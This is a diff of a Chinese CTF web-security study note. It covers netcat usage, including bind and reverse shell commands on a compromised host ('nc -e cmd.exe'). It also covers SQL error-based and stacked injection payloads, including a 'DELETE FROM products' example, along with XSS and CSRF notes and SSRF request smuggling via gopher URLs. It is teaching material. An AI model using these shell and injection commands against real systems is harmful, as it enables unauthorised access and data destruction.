@@ -1,3 +1,5 @@
+
+
 # WEB篇
 
 **tip:计算机网络常用端口汇总！总有你不知道的端口及对应的服务！**
@@ -19,6 +21,138 @@
 | 3389 |         Windows2000（2003）server远程桌面的服务端口          |
 
 [更多……](https://www.douban.com/note/568630865/?start=100)
+
+
+
+## 工具使用
+
+### nc(NetCat瑞士军刀)
+
+#### 简介
+
+​		**Netcat** 常称为 nc，拥有“瑞士军刀”的美誉。nc 小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。
+
+#### 主要功能
+
++ Telnet功能
++ 获取banner信息
++ 传输文本信息
++ 传输文件/目录
++ 加密传输文件，默认不加密
++ 远程控制
++ 加密所有流量
++ 流媒体服务器
++ 远程克隆硬盘
+
+#### 常用命令
+
++ `-u`：使用UDP协议传输
++ `-l`：开启监听
++ `-p`：指定端口
++ `-n`：以数字形式代表ip
++ `-v`：显示执行命令过程
++ `-t`：以telnet形式应答
++ `-z`：不进行交互，直接显示结果
++ `-w`：设置超时时间
++ `-e`：程序重定向
+
+#### 常见的用法
+
+##### 端口扫描
+
+如果想单纯的端口扫描的话，使用其他工具如nmap会更好。nc端口扫描最主要的用途是：当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而我们的nmap工具是不能扫描到内网的。所以这时我们可以把nc上传到web服务器上，利用他来扫描内网主机。而由于nc体积很小，所以不容易被发现。
+
+![image-20210501113359424](CTF-WEB篇.assets/image-20210501113359424.png)
+
+##### 聊天
+
+我们可以利用nc做一个简易版本的聊天工具，通过一边监听端口，一边发送消息去该端口，形成一个简易版本的服务端——客户端模型。
+
+**服务器端**
+
+~~~sh
+nc -lvp 39990 #监听39990端口 -l 监听  -v 显示详细信息  -p 指定端口
+~~~
+
+**客户端**
+
+~~~shell
+nc -nv 39.***.***.*** 39990 #连接到服务器的39990端口 -n 以数字的形式显示 -v显示详信息
+~~~
+
+![image-20210501114205551](CTF-WEB篇.assets/image-20210501114205551.png)![image-20210501114312206](CTF-WEB篇.assets/image-20210501114312206.png)
+
+##### 文件传输
+
+我们可以利用nc往客户端传送文件
+
+**服务器端**：
+
+~~~shell
+nc -vlp 39990 < a.txt
+~~~
+
+**客户端**：
+
+~~~sh
+nc -nv 39.***.***.*** 39990 > a.txt
+~~~
+
+![image-20210501115413602](CTF-WEB篇.assets/image-20210501115413602.png)![image-20210501115531080](CTF-WEB篇.assets/image-20210501115531080.png)
+
+![image-20210501115505312](CTF-WEB篇.assets/image-20210501115505312.png)
+
+##### 反弹shell
+
+> **正向连接，意思就是我们主动连接肉鸡**
+>
+> 假如我们入侵到了一台主机上，我们可以通过执行以下命令将该主机的cmd(shell)权限弹到39990端口上
+
+**肉鸡**
+
+~~~sh
+nc -lvp 39990 -t -e cmd.exe
+~~~
+
+然后我们的主机访问该肉鸡的39990端口
+
+**我们的主机**
+
+~~~shell
+nc -nv 39.***.***.*** 39990
+~~~
+
+![image-20210501120711457](CTF-WEB篇.assets/image-20210501120711457.png)
+
+![image-20210501120755104](CTF-WEB篇.assets/image-20210501120755104.png)
+
+> 反向连接，意思就是我们监听端口，然后肉鸡主动连接到我们的主机
+
+**我们的主机**
+
+~~~sh
+nc -vlp 39990
+~~~
+
+**肉鸡**
+
+~~~sh
+nc -nv -t -c 192.168.1.129 39990
+~~~
+
+![image-20210501122347282](CTF-WEB篇.assets/image-20210501122347282.png)
+
+![image-20210501122435969](CTF-WEB篇.assets/image-20210501122435969.png)
+
+##### 蜜罐
+
+> 作为蜜罐，一直监听39990端口，直到Ctrl+C停止
+
+~~~sh
+nc -lp 39990 > log.txt   #监听8888端口，并且将日志信息写入log.txt中
+~~~
+
+
 
 ## SQL注入
 
@@ -291,7 +425,7 @@ SQL注入分为很多种，有联合注入、布尔注入、报错注入、时�
 + 平时我们最常用到的三种报错注入方式分别是：floor()、updatexml()、extractvalue()。
 
 ~~~sql
-1. select count (*) from information _schema.tables group by concat ((此处加入执行语句),0x7e,floor (rand (0)*2));
+1. select count (*) ,concat ((此处加入执行语句),0x7e,floor (rand (0)*2))  as a from information _schema.tables group by a;
 2. extractvalue (1,concat (0x7e,(此处加入执行语句),0x7e));
 3. select updatexml (1,concat (0x7e,(此处加入执行语句),0x7e),1);
 ~~~
@@ -313,7 +447,23 @@ ord(str):同上，返回ascii码
 if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0
 ~~~
 
+#### 堆叠注入
 
+##### 定义
+
+Stacked Injection(堆叠注入)从名词的含义就可以看到应该是一堆SQL语句（多条）一起执行。真实情况下也是这样的，mysql在命令行中每一条语句结尾加上`;`表示语句结束。这样我们就想到了是不是可以多条SQL语句一起使用。这个就叫Stacked Injection。
+
+##### 原理
+
+ 在SQL中，分号（`;`）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。
+
+##### 局限性
+
+堆叠注入实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。
+
+##### 使用场景
+
++ 在union select等关键字被过滤时，可以考虑使用堆叠注入
 
 #### 二次注入
 
@@ -324,8 +474,9 @@ if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返�
 + 第二步：引用恶意数据
 
   再将数据库存入到数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。
-
+  
 #### 盲注
+
 
 盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称为盲注。盲注分为以下三类：
 
@@ -582,7 +733,7 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 
 ### DOM XSS
 
-
+传统的XSS漏洞一般出现在服务器端代码中，而DOM-Based XSS是基于DOM文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。
 
 
 
@@ -678,11 +829,11 @@ req.send("http://target/page?v1=123&v2=222", "_blank", "GET");
 
 验证码强制用户必须与应用进行交互，才能完成最终请求。
 
-#### Referer Check
+#### Referer Check（同源策略）
 
 检查请求是否来自合法的源，但服务器并非什么时候都能取得Referer。
 
-#### Token
+#### Token（最有效）
 
  CSRF能够攻击成功的本质原因是重要操作的所有参数都可以被攻击者猜测得到。
 
@@ -691,3 +842,181 @@ req.send("http://target/page?v1=123&v2=222", "_blank", "GET");
 Token一定要足够随机。此外，Token的目的不是为了防止重复提交，所以为了使用方便，可以允许在一个用户的有效生命周期内，在Token消耗掉之前都使用同一个Token，但如果用户已经提交了表单，则这个Token已经消耗掉，应该重新生成Token。
 
 Token还应注意其保密性，如果Token出现在url中，则可能会通过Referer泄露，应尽量把Token放在表单中，把敏感操作由GET改为POST，以表单或者AJAX的形式提交，避免Token泄露。
+
+
+
+## SSRF
+
+### Gopher协议在SSRF漏洞中的研究
+
+> 1. 什么是Gopher协议？
+>
+>   
+>    gopher协议支持GET&POST请求，常用于攻击内网ftp、redis、telnet、smtp等服务，还可以利用`gopher`协议访问`redis`反弹`shell`
+>    
+
+
+
+#### 什么是gopher协议？
+
+**定义**：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便的将用户从Internet的一处带到另一处。在www出现之前，Gopher是Internet上主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。
+
+
+
+**限制**：gopher协议在各个编程语言中的使用限制
+
+![preview](CTF-WEB篇.assets/v2-ea9bb9538044933ac3c918d5a56f2d69_r.jpg)
+
+> --wite-curlwrappers：运用curl工具打开url流
+> curl使用curl --version查看版本以及支持的协议
+
+**Gopher协议格式**：
+
+~~~http
+URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
+~~~
+
++ Gopher的默认端口是70
++ 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码
+
+**Gopher发送请求HTTP GET请求：**
+
+使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求
+
+nc启动监听，监听2333端口：nc -lp 2333
+
+使用curl发送http请求，命令为
+
+```php
+margine:~ margin$ curl gopher://192.168.0.119:2333/abcd
+```
+
+此时nc收到的消息为：
+
+```bash
+margine:~ margin$ nc -lp 2333
+bcd
+```
+
+可以发现url中的a没有被nc接受到，如果命令变为
+
+```text
+margine:~ margin$ curl gopher://192.168.0.119:2333/_abcd
+```
+
+此时nc收到的消息为：
+
+```text
+margine:~ margin$ nc -lp 2333
+abcd
+```
+
+所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）
+
+那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：
+
+> 1、构造HTTP数据包
+> 2、URL编码、替换回车换行为%0d%0a
+> 3、发送gopher协议
+
+我准备了一个PHP的代码，如下：
+
+```php
+<?php
+    echo "Hello ".$_GET["name"]."\n"
+?>
+```
+
+一个GET型的HTTP包，如下：
+
+```http
+GET /ssrf/base/get.php?name=Margin HTTP/1.1
+Host: 192.168.0.109
+```
+
+URL编码后为：
+
+```http
+curl gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A
+```
+
+在转换为URL编码时候有这么几个坑
+
+> 1、问号（？）需要转码为URL编码，也就是%3f
+> 2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
+> 3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）
+
+**Gopher发送请求HTTP POST请求：**
+
+发送POST请求前，先看下POST数据包的格式
+
+```text
+POST /ssrf/base/post.php HTTP/1.1
+host:192.168.0.109
+
+name=Margin
+```
+
+那我们将上面的POST数据包进行URL编码并改为gopher协议
+
+```http
+curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A
+```
+
+post.php的代码为
+
+```text
+<?php
+    echo "Hello ".$_POST["name"]."\n"
+?>
+```
+
+现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：
+
+```http
+192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] "POST /ssrf/base/post.php HTTP/1.1" 200 7
+192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] "name=Margin" 501 213
+[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin
+```
+
+这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）：
+
+```text
+POST /ssrf/base/post.php HTTP/1.1
+host:192.168.0.109
+Content-Type:application/x-www-form-urlencoded
+Content-Length:11
+
+name=Margin
+```
+
+现在我们将它进行URL编码：
+
+```text
+curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A
+
+```
+
+发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。
+
+
+
+
+
+
+
+## RCE
+
+![image-20210430133142836](CTF-WEB篇.assets/RCE.png)
+
+**漏洞形成的条件**：
+
+1. 可控变量
+2. 漏洞函数
+
+
+
+文件包含：伪协议
+
+
+
